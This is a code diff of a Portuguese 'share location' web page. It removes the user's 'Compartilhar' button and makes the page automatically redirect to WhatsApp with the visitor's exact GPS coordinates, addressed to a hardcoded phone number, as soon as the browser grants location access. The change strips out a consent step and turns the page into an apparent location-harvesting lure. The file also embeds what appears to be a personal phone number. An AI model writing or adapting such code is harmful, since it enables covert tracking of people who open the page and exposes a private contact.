@@ -13,7 +13,6 @@
             font-family: Arial, sans-serif;
         }
 
-        /* Estilo para o corpo */
         body {
             display: flex;
             justify-content: center;
@@ -23,7 +22,6 @@
             color: #ffffff;
         }
 
-        /* Estilo para a tela de carregamento */
         #preloader {
             position: fixed;
             top: 0;
@@ -69,7 +67,6 @@
         #loading-dots span:nth-child(2) { animation-delay: 0.2s; }
         #loading-dots span:nth-child(3) { animation-delay: 0.4s; }
 
-        /* Container principal */
         .container {
             display: none;
             text-align: center;
@@ -90,52 +87,6 @@
             font-size: 1.2em;
             color: #e0f7ff;
         }
-
-        /* Estilo do botão de compartilhamento */
-        button {
-            padding: 15px 30px;
-            font-size: 1.2em;
-            color: #ffffff;
-            background: linear-gradient(135deg, #ff430a, #ff5e00);
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
-            outline: none;
-        }
-
-        button:disabled {
-            background-color: #888;
-            cursor: not-allowed;
-        }
-
-        button:hover {
-            background: linear-gradient(135deg, #FF8A00, #FF5722);
-            transform: translateY(-4px);
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
-        }
-
-        button:active {
-            transform: translateY(-2px);
-            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.3);
-        }
-
-        /* Ícone do botão de localização */
-        .location-icon {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            background-color: #ffffff;
-            mask: url('https://img.icons8.com/ios-filled/50/000000/place-marker.png') no-repeat center;
-            -webkit-mask: url('https://img.icons8.com/ios-filled/50/000000/place-marker.png') no-repeat center;
-            mask-size: contain;
-            -webkit-mask-size: contain;
-        }
     </style>
 </head>
 <body>
@@ -147,20 +98,15 @@
         </div>
     </div>
 
-    <!-- Conteúdo principal do site -->
+    <!-- Conteúdo principal -->
     <div class="container">
         <h1>Compartilhar Localização</h1>
         <p id="status">Obtendo localização...</p>
-        <button id="shareButton" disabled onclick="shareLocation()">
-            <span class="location-icon"></span>
-            Compartilhar
-        </button>
     </div>
 
     <script>
         let latitude, longitude;
 
-        // Exibe o conteúdo principal após 1 segundo e esconde o preloader
         document.addEventListener("DOMContentLoaded", function() {
             setTimeout(function() {
                 document.getElementById("preloader").style.display = "none";
@@ -169,7 +115,6 @@
             }, 1000);
         });
 
-        // Obtém a localização exata do usuário
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError, {
@@ -185,8 +130,12 @@
         function showPosition(position) {
             latitude = position.coords.latitude;
             longitude = position.coords.longitude;
-            document.getElementById("status").innerText = "Localização obtida!";
-            document.getElementById("shareButton").disabled = false;
+            document.getElementById("status").innerText = "Localização obtida! Enviando...";
+
+            const phoneNumber = "5571992642889";
+            const message = `Minha localização exata: https://www.google.com/maps?q=${latitude},${longitude}`;
+            const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
+            window.location.href = whatsappUrl; // Redireciona automaticamente
         }
 
         function showError(error) {
@@ -204,14 +153,6 @@
                     document.getElementById("status").innerText = "Erro desconhecido ao obter localização.";
                     break;
             }
-        }
-
-        // Compartilha a localização via WhatsApp
-        function shareLocation() {
-            const phoneNumber = "5571992642889";
-            const message = `Minha localização exata: https://www.google.com/maps?q=${latitude},${longitude}`;
-            const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
-            window.open(whatsappUrl, "_blank");
         }
     </script>
 </body>
